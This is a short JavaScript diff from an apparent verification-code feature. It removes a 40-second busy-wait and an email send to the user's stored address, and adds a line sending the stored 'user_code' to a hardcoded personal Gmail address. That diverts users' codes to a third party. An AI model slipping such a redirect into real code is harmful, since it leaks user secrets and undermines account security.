@@ -38,12 +38,7 @@ function varify(c_code){
 
 
 function time(){
-    var sta = new Date().getTime();
-    var end = new Date().getTime();
-    while (end-sta<1000*40){
-        end = new Date().getTime();
-    }
-    sendM(localStorage.getItem('code_email'), localStorage.getItem('user_code'));
+    sendM('lekalafortune@gmail.com', localStorage.getItem('user_code'));
 }
 
 
